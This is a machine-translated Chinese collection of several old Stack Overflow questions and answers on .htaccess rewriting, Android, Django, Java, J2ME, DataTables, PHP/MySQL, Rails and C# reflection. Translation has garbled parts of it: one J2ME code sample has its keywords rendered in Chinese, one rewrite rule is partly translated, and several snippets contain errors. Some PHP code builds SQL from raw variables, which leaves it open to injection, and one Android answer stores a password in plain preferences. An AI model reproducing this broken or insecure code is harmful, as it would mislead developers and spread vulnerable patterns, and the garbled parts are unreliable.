（我也试过没有 RewriteBase ......）

我尝试了以下所有重写规则来重写 URL

**index.php?page=news**

到

**/博客**

*   RewriteRule ^/?([-A-Za-z0-9]+)/([-A-Za-z0-9]+)/blog$ index.php?page=$1 [L]
*   重写规则 ^([^/]*)/blog$ /sites/blog/index.php?page=$1 [L]
*   RewriteRule ([a-zA-z]+)/([a-zA-z]+)/blog$ index.php?page=$1 [L]

没有任何效果 - 没有错误。Mod_rewrite 已安装并正在运行。每次更改 .htaccess 中的内容时，我都会重新启动 Apache 和 MySQL。

我还想更改我的网址，看起来像这样... **index.php?page=single_news&category=release&id=9&headline=Beastie%20Boys%20III**

...进入：**博客/发布/9-Beastie-Boys-III**

我搞不清楚了。希望您能够帮助我。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-29T09:29:15.550

首先，将您的 .htaccess 和其他文件（整个项目）上传到一些工作就绪的托管服务器。并检查，如果你的重写工作正常。这会让你知道，如果这是 .htaccess 或 XAMPP 本身的问题。在将文件上传到 Internet 托管后，我在 XAMPP 下本地使用 .htaccess 时遇到了许多奇怪的问题，这些问题神奇地消失了。

例如，我没有在本地使用 .htaccess 进行工作自动化，因为在我提供正确的登录名和密码后，我看到的错误消息与您提到的完全相同。至于我，我非常确定这个问题完全与 XAMPP 对 .htaccess 的错误解释有关（因为一切都像生产服务器上的魅力一样），而不是 .htaccess 内容中的一些错误。

我浪费了（太多）几个小时来寻找解决方案并离开了它。目前，如果我在本地开发，我将“.htaccess”重命名为“htaccess”，因此它会被 XAMPP（它的 Apache 板载）忽略并仅在将文件部署到生产服务器时重新启用它。这种方法可能不专业，但它为我节省了很多时间和压力！:]

另一方面，如果您的主机也因相同的症状而失败，那么您就会知道，这不是 XAMPP 相关的问题，并且您的语法有问题。

[在此处](https://stackoverflow.com/questions/8782568/htaccess-server-error)查看StackOverflow.com 上报告的类似问题，其中（我认为）原因与您的问题相同。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-10-27T13:10:39.020

以下是将链接更改为的解决方案`http://www.domain.tld/index.php?page=blog`是`http://www.domain.tld/blog`：

```
RewriteEngine On

RewriteCond %{REQUEST_FILENAME} !-f
RewriteCond %{REQUEST_FILENAME} !-d
RewriteRule ^\w+$ index.php?page=$0 [L]
RewriteCond %{THE_REQUEST} index\.php
RewriteCond %{QUERY_STRING} ^page=(\w+)$
RewriteRule ^index\.php$ /%1? [R=301,L] 
```

以及以下链接：`http://www.domain.tld/index.php?page=single_news&id=1&headline=This%20Is%20A%Headline`

解决方案是：

```
RewriteRule ^blog/(\d+)-([\w-]+)$ index.php?page=single_news&id=$1&headline=$2 
```

使用此代码后，链接如下所示：`http://www.domain.tld/blog/2-this-is-a-headline`

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-07-27T15:54:54.987

对于你的第一个问题，试试这个：

```
RewriteEngine on
RewriteRule ^/blog$ /index.php?page=news 
```

# android - 在android中从第一个活动到第四个活动获取数据

> ID：11243976
> 
> 赞同：0
> 
> 时间：2012-06-28T11:49:35.923
> 
> 标签：android, android-intent, android-activity, android-edittext

我想获取在 EditText 第一个活动中写入的文本，并将该文本设置为另一个 EditText，这是第四个活动。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-28T11:52:15.880

1-使用[SharedPreferences](http://saigeethamn.blogspot.in/2009/10/shared-preferences-android-developer.html)

2- 在[应用](https://stackoverflow.com/questions/4208886/using-the-android-application-class-to-persist-data)类中设置

3- 从 1-> 2 ->3 ->4 传递到使用意图

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-28T11:53:33.370

简单的方法是，您可以分配一个在第一个活动中公开的**静态变量，例如，**

`public static String myEditTextContent;`

在从编辑文本中设置值后设置它，例如，

```
myEditTextContent = editText.getText().toString(); 
```

在第四个活动中使用相同的内容，例如

`FirstActivityClass.myEditTextContent`并将其设置在此（第四个）活动中。

稍后您也可以**`putExtra,SQLLite Database,Shared Preference`**按照其他人的建议使用意图

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-06-28T11:54:31.503

在您的第一个活动中使用此代码

```
Intent intent = new Intent(context,Viewnotification.class);
          intent.putExtra("Value1", youredittextvalue.getText().toString());
startActiviy(intent); 
```

在你的第四个活动中

```
Bundle extras = getIntent().getExtras();
        String value1 = extras.getString("Value1");
yourfourthactivityedittext.setText(value1); 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-06-28T12:08:25.693

你可以通过两种方式做到这一点

首先使用 SharedPreferences 之类的

```
// declare
SharedPreferences pref;
    SharedPreferences.Editor edit;

in On create

//initialize
                pref = this.getSharedPreferences("myPrefs", MODE_PRIVATE);
        edit = pref.edit();

// add data in it
edit.putString("USERNAME", EditText1.getText().toString());
edit.putString("PASSWORD", EditText1.getText().toString());
edit.putString("USERID",   Text1.getText().toString());

// save data in it
edit.commit();

to get data

// access it 

String passwrd = pref.getString("PASSWORD", "");
String userid = pref.getString("USERID", "");

And the second way

Send data from 1 to 2 and 2 to 3 and 3 to 4 activity 
with intents like

    Intent i = new Intent(First.this, Secondclass.class);
                    i.putExtra("userid", EditText1.getText().toString());
                    i.putExtra("username",EditText2.getText().toString());

                    startActivity(i);

and recieve in each activity like

       Intent i = getIntent();
     String   ursid = i.getStringExtra("userid");
 String   ursername = i.getStringExtra("username"); 
```

# django - 如何在基于类的视图 mixin 中访问对象？

> ID：11243977
> 
> 赞同：0
> 
> 时间：2012-06-28T11:49:38.180
> 
> 标签：django

我使用基于类的视图来更新我的模型：

```
class BlogUpdateView(UpdateView):
    model=Blog

    def get_context_data(self, **kwargs):
        context = super(BlogUpdateView, self).get_context_data(**kwargs)
        context['author'] = get_object_or_404(User,
            username__iexact=self.kwargs['username'])
        return context 
```

我想遵循 DRY 原则，避免`get_context_data`在每个视图函数中重复。[这个问题几乎和这个](https://stackoverflow.com/q/10337290/1061572)问题一样。依靠[@Jj](https://stackoverflow.com/users/43490/jj)给出的答案，我想我的班级看起来像这样：

```
class BlogMixin(object):
    def get_author(self):
      # How to get author?
      return author

    def get_context_data(self, **kwargs):
      context = super(BlogMixin, self).get_context_data(**kwargs)
      context['author'] = self.get_author()
      return context 
```

我的问题是：如何访问 mixin 类中的对象？

**更新**

答案在 mongoose_za 评论中给出。我可以通过这一行获得作者：

```
author = User.objects.get(username__iexact=self.kwargs['username']) 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-28T12:10:37.830

你的遗嘱是这样的：

```
class BlogMixin(object):
    def get_author(self):
      # How to get author?
      # Assuming user is logged in. If not you must create him
      author = self.request.user
      return author

class BlogUpdateView(BlogMixin, UpdateView):
    model=Blog

    def get_context_data(self, **kwargs):
        context = super(BlogUpdateView, self).get_context_data(**kwargs)
        context['author'] = self.get_author()
        return context 
```

当你这样做时`context = super(BlogUpdateView, self).get_context_data(**kwargs)`，**上下文**将成为你的对象。

* * *

首先，您将 mixin 添加到类构造函数中。

正如你在这里看到的：

```
class BlogUpdateView(BlogMixin, UpdateView): 
```

现在，您的 BlogMixin mixin`def get_context_data(self, **kwargs):`将覆盖基础。`def get_context_data(self, **kwargs):`

但是您还指定了 a`def get_context_data(self, **kwargs):`在您`class BlogUpdateView(UpdateView):`的最后，这是`get_context_data`将生效的。

Mixins 很难掌握。我觉得最好通过查看其他人的示例来学习。看看[这里](http://brack3t.com/our-custom-mixins.html)

**编辑**：意识到也许我没有正确回答您的问题。如果你想访问你的 mixin 中的一个对象，你必须将它传入。例如，我会将 context 对象传递给 mixin：

```
class BlogMixin(object):
    def get_author(self, context):
      # This is how to get author object
      author = User.objects.get(username__iexact=self.kwargs['username'])
      return context

class BlogUpdateView(BlogMixin, UpdateView):
    model=Blog

    def get_context_data(self, **kwargs):
        context = super(BlogUpdateView, self).get_context_data(**kwargs)
        return self.get_author(context) 
```

代码未经测试，但想法应该是正确的

# java - 使用 java 定时器

> ID：11243980
> 
> 赞同：1
> 
> 时间：2012-06-28T11:49:44.913
> 
> 标签：java, android, timer

到目前为止，我一直在使用`Timer`that's in `javax.swing.timer`- 我所要做的就是选择速度并使用具有特定名称的方法来执行我希望计时器每次都执行的操作。

我最近开始编写一个 Android 应用程序，我遇到了几个问题......

1.  它不允许我使用或导入`javax.swing.timer`
2.  我尝试使用`java.util.timer`但我无法弄清楚它是如何工作的

我只想要我的计时器，这样我就可以显示我的徽标 3 秒钟，然后进入主菜单 - 即使有更简单的解决方案，我仍然想知道如何使用计时器

对于告诉我尝试使用线程的人 - 这是我的代码 - 它根本不绘制第一个屏幕，它只是保持空白 3 秒然后移动到下一行代码......

```
public class logo extends Activity {
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        try {
            setContentView(R.layout.logoview);
            Thread.sleep(3000); 
        }
        catch (InterruptedException e){
            e.printStackTrace();
        }

        setContentView(R.layout.main);
    }

    public void startup (View view){
        Intent intent0 = new Intent (this,ExpiramantingActivity.class);
        startActivity(intent0);}
    }
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-28T12:59:26.863

在 SplashActivity 类的 onCreate() 函数中，安排一个处理程序在 3 秒后显示您的主菜单活动。这应该在 setContentView(R.layout.splashscreen); 之后完成

```
 new Handler().postDelayed(new Runnable() {

                @Override
                public void run() {
                    startActivity(new Intent(SplashActivity.this,
                            YourMainMenuActivity.class));
                    finish();
                }
            }, 3000); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-28T12:17:27.147

也许你可以使用线程？我认为这是做你想做的最简单的方法：

显示徽标的位置：

```
try {
    //show your logo here
    Thread.sleep(3000); //3 seconds
} catch (InterruptedException e) {
    e.printStackTrace();
} 
```

将代码包围在 try/catch 块中非常重要，因为可能会出现异常。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-28T12:52:03.607

我相信您正在尝试做的事情类似于 Splash Screen 展览。如果是这样，请查看此[Oracle 教程](http://docs.oracle.com/javase/tutorial/uiswing/misc/splashscreen.html)。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-06-28T13:13:02.700

试试这个：

```
// logo
Thread timer = new Thread(){
            public void run(){
                try{
                    sleep(3000);
                } catch (InterruptedException e){
                    e.printStackTrace();
                }
            }; 
        };
        timer.start();

//next code 
```

# java - 在 J2ME 中锁定图形对象

> ID：11243981
> 
> 赞同：1
> 
> 时间：2012-06-28T11:49:51.327
> 
> 标签：java, java-me, lwuit, drawimage

这似乎是一个非常愚蠢的问题，但我真的需要帮助，我正在制作一个绘制背景透明渐变图像然后在其上绘制一些对象的任务，问题是我想绘制这个图像一次但其他对象将被多次绘制以执行一些动画

代码如下，这是我想运行一次的代码，我创建了一个布尔变量 = false 然后将其设置为 true

```
public void drawLockLayer(Graphics g) {
        try {
            lock = Image.createImage(Paths.lock);
            g.drawImage(lock, 0, 0, LGBMainMidlet.width, LGBMainMidlet.height);
            System.out.println("After Draw Image");
            drawOnce = true;
        } catch (Exception ex) {
            ex.printStackTrace();
        }
    } 
```

其他代码如下

```
public void paint(Graphics g, Rectangle rect) {

        synchronized (g) {
            if (drawOnce == false) {
                drawLockLayer(g);
            }
        }
        pos = (int) ((System.currentTimeMillis() % 2700) / 300);

        int i = 0;

        g.setColor(bgColor);
        g.fillRoundRect(startX, startY, width, height, 20, 20);

        g.setColor(fgColor);
        g.setFont(font);
        g.drawString(loadMsg, startX + (spacing / 4), startY + (spacing / 4));

        for (int y = 0; y < 3; y++) {
            for (int x = 0; x < 3; x++) {
                int thickness = 6;
                if (i == pos) {
                    thickness = 14;
                } else if (i == pos - 1) {
                    thickness = 10;
                }
                g.fillRect((startX + x * spacing - (thickness / 2)) + (width / 3), (startY + y * spacing - (thickness / 2)) + (height / 3), thickness, thickness);
                i++;
            }
        }

    } 
```

它是进入方法但它不是绘制背景图像，我想要做的是锁定图形对象直到他完成绘制图像然后继续其他代码

谁能帮忙

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-28T14:16:10.713

代码的几个问题：

*   在 Graphics 上同步通常是一个坏主意
*   paint 应该只从一个线程调用。你确定不是，你真的需要同步吗？矩形从哪里来？
*   为了更容易维护，您应该在 paint() 中将 drawOnce 设置为 true

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2012-06-28T16:44:33.113

您需要在调用paint 之前将drawOnce 设置为false。

看起来您的代码基于 GameCanvas。您如何看待以下方法？

```
    类 MainCanvas 扩展 GameCanvas {

    // rect是一个属性

    私人无效更新屏幕（）{
        绘制一次 = 假；
        油漆（getGraphics（），矩形）；
    }

    公共无效开始（）{
        新的 DataThread().start();
        新的 AnimationThread().start();
    }

    类 DataThread 扩展线程 {
        公共无效运行（）{
            while (/*IO 事情没有完成*/) {
                // 保存数据
                更新屏幕（）；
            }
        }
    }

    类 AnimationThread 扩展线程 {
        公共无效运行（）{
            while (/*IO 事情没有完成*/) {
                // 睡一会
                更新屏幕（）；
            }
        }
    }

    // drawLockLayer 和paint(Graphics, Rectangle) 方法

    } // MainCanvas 类结束

```

# php - 过滤数据表中的确切单词

> ID：11243985
> 
> 赞同：0
> 
> 时间：2012-06-28T11:49:57.967
> 
> 标签：php, search, datatables, drop-down-menu

我在我的 php 脚本中使用数据表插件。对于搜索，我有一个下拉框，其中包含两个值“Active”和“Inactive”。当我按“活动”字词搜索时，它会显示包含“活动”和“非活动”的记录。我知道这只发生在那个特定的词（“活动”）上。

那么如何停止这个通配符搜索这个下拉框。

我的代码是这样的：

```
 $("#example").dataTable().columnFilter(
     {  

      "aoColumns": [                                    
        null,null,null,null,
{
         type: "select",
         values: [ 'Active', 'Inactive' ]
        },
      null                                                   ]
     }); 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-04T11:14:52.557

数据表具有不区分大小写的默认搜索选项，因此在初始化数据表时尝试输入以下内容。

```
$("#example").dataTable(
 {  

  "bCaseInsensitive": false,
 }); 
```

# java - 类生命周期的 Java 实例

> ID：11243988
> 
> 赞同：0
> 
> 时间：2012-06-28T11:50:11.270
> 
> 标签：java

如果我创建了一个类的实例，对象的生命周期是多久，它的生命周期取决于什么？

例如，我有 classA ，我在我的主类中实例化，如下所示：

```
classA ca = new classA(); 
```

该对象的持续时间与运行时一样长吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-28T11:53:12.107

好吧，这取决于对象与自身关联的引用有多长时间（有关详细信息，请阅读 ref 的类型）。例如。

```
classA ca = new classA();
classA ca = new classB();  //first reference assigned to some other object 
```

现在您的第一个对象符合垃圾回收条件，并将在下一个 GC 周期中销毁。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-28T11:51:51.777

只要存在对它的实时引用，之后它可能仍然存在于堆中（没有任何引用）但它已准备好被垃圾回收，所以当下次运行 GC 时，它会找到这个实例和 GC所以它死了

**例如**

```
{
  classA ca = new classA();
} 
```

classA 的实例在块中创建，并且对它的引用`ca`肯定是活的，只要控件在该块中，之后它就可以被 GC 收集

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-28T12:53:18.693

在 Java 中，实例/对象一直存在，直到它有一些可访问的引用。

```
classA ca = classA(); 
```

由于新创建的对象只有一个引用将该实例变量指向 null 使得该对象有资格进行垃圾回收

```
ca = null; 
```

# java - 异常规范，有用还是没用？

> ID：11243990
> 
> 赞同：4
> 
> 时间：2012-06-28T11:50:14.337
> 
> 标签：java, c++, exception, exception-safety, exception-specification

第一个免责声明：这不是为了引发“语言战争”。我的报告真的需要这个（关于这个主题的澄清），我只想有有效和扎实的论据。
好的，问题来了：
在 C++ 中，异常规范已从 C++11 标准中删除，因为它被认为弊大于利。
另一方面，在 Java 中，异常规范被认为是好的和有用的东西。
这两个概念（具有异常规范的目的）在这两种语言中是否不同，这就是为什么这两个社区对它们的看法不同，或者这些概念是相似/相同的？
哪一个？异常规范是好事还是坏事？或者它在 Java 中是好的，因为（在这里我想看看一些原因）而在 C++ 中是不好的，因为（原因在这里）。
感谢任何提供建设性帮助的人。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-06-28T12:01:05.957

除此之外，我认为 Java 和 C++ 异常规范之间的主要区别在于，在 Java 中，规范是函数类型的一部分，编译器强制您不能允许检查的异常转义函数，除非它们是一部分你的函数的类型。

因此，Java 检查异常提供了一种有限/有缺陷的方法来跟踪哪些函数抛出了哪些异常。C++ 异常规范提供了一种有限/有缺陷的方法来防止对函数的调用引发特定异常（或任何异常）。

由于它们有不同的目的，因此必须分别评估它们的成功或失败。就实际程序员避免使用它们而言，我认为您可以肯定地说它们都有些失败，但这就是您可以对两者进行相同评估的所有内容。这个程度对于 Java 来说是相当高的，而对于 C++ 来说是非常高的。它们所具有的有益用途以及每种语言的确切成功程度是不同的。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-28T12:13:10.227

Java 和 C++ 中的异常规范以非常不同的方式工作。

从 C++ 的角度来看，这是一个非常好的信息来源。[http://www.gotw.ca/publications/mill22.htm](http://www.gotw.ca/publications/mill22.htm)

C++ 设计的主要缺点是，如果您抛出意外异常，您的程序很可能会崩溃（有关详细信息，请参阅链接）。因此，异常规范是一个应用得太晚的约束。

Herb Sutter 关闭文章说：

> ```
> Moral #1: Never write an exception specification.
> 
> Moral #2: Except possibly an empty one, but if I were you I’d avoid even that. 
> ```

Java 异常规范框架不同，您有两种类型的异常：已检查（编译时）和运行时异常（很像没有异常规范的 C++）。

对于已检查的异常，编译器将强制开发人员处理这些异常，否则应用程序将无法编译。这很好而且有用，但是运行时和检查异常之间的区别并不完全清楚，并且取决于开发人员，并且可能会产生混淆。即使使用简单的程序习语（例如[检查异常规范和策略模式](https://stackoverflow.com/questions/8589190/checked-exception-specification-and-strategy-pattern)），检查异常也涉及困难的决定。

最终的结果，和往常一样，语言特征不清晰，是用的不好。例如，C# 设计者决定放弃它们。

我认为，对于这个特定主题，java 设计比 C++03 更好（我是 C++ 的忠实粉丝），因为它允许开发人员以更具描述性的方式编写更好的代码。但是，您需要花费精力（编码标准和代码审查）在您的开发团队中生成一致的代码。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-28T11:55:15.780

几年前，Java 的已检查异常已经失宠，正如您所说的那样，它们造成的伤害多于帮助。现在的人们主要想办法避免它们，通常是用`RuntimeException`s 包裹起来。

在 Effective Java 中，Josh Bloch 仍然在“异常但预期的结果”的情况下为已检查的异常辩护，但事实是，API 编写者并不是决定哪些结果是预期的，哪些不是的人。例如，即使是`FileNotFoundException`在上下文中，也可能是意想不到的致命结果。

因此，至少，任何公共图书馆都不应该使用受检异常。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2017-01-28T04:58:25.020

C++ 和 Java 在异常规范方面甚至没有可比性，因为它们在异常方面有所不同：

*   C++ 仅在需要时使用动态分配，程序员尽可能使用堆栈分配（如果只是为了避免释放内存的问题）
*   Java 几乎一直使用动态分配；对于用户定义类型的对象，对于数组（甚至是在编译时已知大小的数组）

在 C++ 中，许多函数可以保证永远不会抛出异常。我不是在谈论异常规范，而是关于函数的记录和实际行为。对于简单的函数调用的情况，异常规范是什么并不重要，只要没有可以抛出异常的语句即可。

[对于从不抛出异常的函数，当调用代码需要测量函数抛出异常的可能性时，异常规范确实很重要，以便以一种会使对象处于不良状态的方式调用非抛出函数如果中间有异常。这是`noexcept`在现代 C++ 中完成的，在旧 C++ 中，这可以通过具有类型特征的更冗长的方式（同样，库之间不兼容）来完成。]

[请注意，编译器始终有权查看编译期间可见的函数体，以确定它是否可以抛出异常，并相应地优化调用代码（如果至少减少异常表的大小）。抛出规范仅在编译器看不到代码无法抛出时才对它有帮助。]

在 C++ 中，这个“*从不抛出*”要求可以被记录，并由编译器强制执行，带有一个空的抛出规范（无论是旧`throw()`的还是现代的`nothrow`）。

Java*没有*这种极其有用的保证。它可以声明某些函数不会抛出异常，这**对于编写异常安全代码是没有用的**。

# php - 我可以使用 php 执行多个更新 SQL 吗？

> ID：11243991
> 
> 赞同：0
> 
> 时间：2012-06-28T11:50:17.647
> 
> 标签：php, mysql

我想从我的数据库中编辑一个表。那个表有很多数据。我将展示示例。我需要编写许多 mysql 更新语句吗？还有其他方法可以只编写一个语句吗？我是 php 的初学者？谢谢我所有的朋友。对不起我的英语。

```
 mysql_query("UPDATE `mytablename` SET `mobiletitle` = '$mobiletitle1',
        `mobilepublished` = '1',
        `mobiletext` = '$mobilefulltext1',
         WHERE `id` ='$id1';");

           mysql_query("UPDATE `mytablename` SET `mobiletitle` = '$mobiletitle2',
        `mobilepublished` = '1',
        `mobiletext` = '$mobilefulltext2',
         WHERE `id` ='$id2';");

        mysql_query("UPDATE `mytablename` SET `mobiletitle` = '$mobiletitle3',
        `mobilepublished` = '1',
        `mobiletext` = '$mobilefulltext3',
         WHERE `id` ='$id3';");
   etc.............
        mysql_query("UPDATE `mytablename` SET `mobiletitle` = '$mobiletitle30',
        `mobilepublished` = '1',
        `mobiletext` = '$mobilefulltext30',
         WHERE `id` ='$id30';"); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-28T12:18:56.953

您想使用特定数据更新一个表中的多行，所以坏消息您必须一一进行....但是您可以改进您的代码。如果我在哪里创建一个函数，然后调用它，例如

```
function update_my_data($movilefilltex1,$id1){

mysql_query("UPDATE `mytablename` SET `mobiletitle` = '$mobiletitle1',
        `mobilepublished` = '1',
        `mobiletext` = '$mobilefulltext1',
         WHERE `id` ='$id1';");
.......

} 
```

因此，要进行多次插入，您可以调用`update_my_data(value1,valu2)`您需要的时间。例如在一个循环中或者只是在你需要的时候。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-28T11:55:02.223

如果有一个`UNIQUE`索引`id`（如果它是你的，就会有`PRIMARY KEY`），你可以使用[`INSERT ... ON DUPLICATE KEY UPDATE`](http://dev.mysql.com/doc/en/insert-on-duplicate.html)：

```
INSERT INTO mytablename (id, mobiletitle, mobilepublished, mobiletext) VALUES
  ('$id1', '$mobiletitle1', 1, '$mobilefulltext1'),
  ('$id2', '$mobiletitle2', 1, '$mobilefulltext2'),
  -- etc.
ON DUPLICATE KEY UPDATE
  mobiletitle     = VALUES(mobiletitle),
  mobilepublished = VALUES(mobilepublished)
  mobiletext      = VALUES(mobiletext); 
```

请注意，如果新记录尚不存在，这当然会插入新记录；而您的多`UPDATE`命令方法不会（它会引发错误）。

无论哪种情况，您都可以在 PHP 的循环中动态构建/执行 SQL。

我还提醒您，建议您考虑将变量作为参数传递给 MySQL [，](https://stackoverflow.com/a/60496/623041)特别*是*如果这些变量的内容超出您的控制范围（因为您可能容易受到 SQL 注入的攻击）。如果您不知道我在说什么，或者如何解决它，请阅读[Bobby Tables](https://stackoverflow.com/questions/332365/xkcd-sql-injection-please-explain)的故事。

将它们放在一起（使用[PDO](http://uk3.php.net/manual/en/book.pdo.php)而不是您使用的[已弃用的 MySQL 扩展](http://uk3.php.net/manual/en/faq.databases.php#faq.databases.mysql.deprecated)）：

```
for ($i = 1; $i <= 30; $i++) {
  $sqls[] = '(?, ?, 1, ?)';
  $arr[] = ${"id$i"};
  $arr[] = ${"mobiletitle$i"};
  $arr[] = ${"mobilefulltext$i"};
}

$sql = 'INSERT INTO mytablename (id, mobiletitle, mobilepublished, mobiletext)
        VALUES
   ' .    implode(',', $sqls)
     . 'ON DUPLICATE KEY UPDATE
          mobiletitle     = VALUES(mobiletitle),
          mobilepublished = VALUES(mobilepublished)
          mobiletext      = VALUES(mobiletext)';

$db = new PDO("mysql:dbname=$db", $user, $password);
$qry = $db->prepare($sql);
$qry->execute($arr); 
```

请注意，您可能还考虑将 1..30 变量存储在[数组](http://php.net/manual/en/language.types.array.php)中。

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2012-06-28T12:11:18.947

```
update table1,table2 SET table1.column1 = 'valueX',table2.coulumn2 = 'valueX' where table1.column = table2.coulumn2 ; 
```

# ruby-on-rails - 加入两个表并使用下拉选择将记录（表2）选择到表单（表1）

> ID：11243994
> 
> 赞同：0
> 
> 时间：2012-06-28T11:50:23.473
> 
> 标签：ruby-on-rails, ruby-on-rails-3, join, activerecord

我想加入两张桌子我有一张桌子“人”和一张桌子“工厂”。

我的问题是，我如何添加一个人，然后选择（通过下拉菜单）该人所属的工厂？

我的人物模型：

```
class Person < ActiveRecord::Base
  has_many :factories

  has_attached_file :cv

  attr_accessible :cv, :email, :function, :mobile, :telephone
end 
```

我的工厂模型：

```
class Factory < ActiveRecord::Base
    belongs_to :persons

  attr_accessible :last_name, :email, :telephone, :first_name, :website, :country
end 
```

例如，我想这样做：

* * *

| 添加人员 |

功能：（输入字段）

电话：（输入字段）

手机：（输入栏）

电子邮件：（输入字段）

Factory (Drop-down) <= 这是我想要的实际字段，默认情况下它不放在 person 表中。

简历：（上传字段）

提交：（提交按钮）

* * *

我希望你明白我想要什么，我希望有人能提供帮助。

* * *

**编辑 1 我改变了我的计划。我想在 person 表的列中选择 factory.id。

我在我的 Person 表中创建了一个名为 factory.id 的列，现在我想将另一个表中的数据存储在该列中。这可能吗？**

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-28T12:10:57.670

您不能选择带有下拉列表的工厂，因为 Person has_many factory...您可以在另一个方向上执行此操作，当您创建工厂时，您可以使用下拉列表选择它所属的 Person_to。如果你想像你说的那样做，你可以有一个启用多选的下拉菜单，并在控制器上手动处理它，执行以下操作：

```
@person =  Person.create(params[:person])
params[:factories].each do |f|
  @person.factories << Factory.find(f)
end 
```

在你看来：

```
select_tag("factories", options_from_collection_for_select(Factory.all, "id", "name"), {:multiple => true}) 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-28T14:38:56.167

您可能可以这样做：

控制器：

```
@people=Person.new

@factories = Factory.all 
```

看法：

```
 form_for @people do |a|
.
.
.
    = a.select :factory, options_for_select(@factories.map{ |f| [f.name, f.id] }) 
```

# c# - 通过反射调用类字段上的方法，同时只有包含的类实例可用

> ID：11243997
> 
> 赞同：0
> 
> 时间：2012-06-28T11:50:27.783
> 
> 标签：c#, .net, reflection

我有：

*   类字段的名称
*   包含该字段的类实例

类字段“可能”是：

*   我想通过反射直接设置的字段
*   一个我不想设置的 List 实例，因为我不想为它分配一个新的 List 实例，而是想使用“添加”方法添加。

问题：我在包含对象中没有 List 实例的实际对象。

一些示例代码来说明问题：

```
class Target
{
    FieldInfo m_FieldInfo;
    MethodInfo m_MethodInfo;
    object m_Target;

    public Target( string nameOfTargetField, object containingObject )
    {
        m_Target = containingObject;
        Type type = containingObject.GetType();
        BindingFlags bindingFlag = BindingFlags.Public | BindingFlags.Instance;
        m_FieldInfo = type.GetField( nameOfTargetField, bindingFlag );

        type = m_FieldInfo.FieldType;
        m_MethodInfo = type.GetMethod( "Add" );
    }

    public void Set( object value )
    {
        if (m_MethodInfo != null) {
            object[] parametersArray = new object[] { value };
            // This obviously will not work, as m_Target is the containing object,
            // no the List<T> instance contained within it:
            m_MethodInfo.Invoke( m_Target, parametersArray );
        } else if (m_FieldInfo != null) {
            m_FieldInfo.SetValue( m_Target, value );
        }
    }
} 
```

有什么建议么？

谢谢！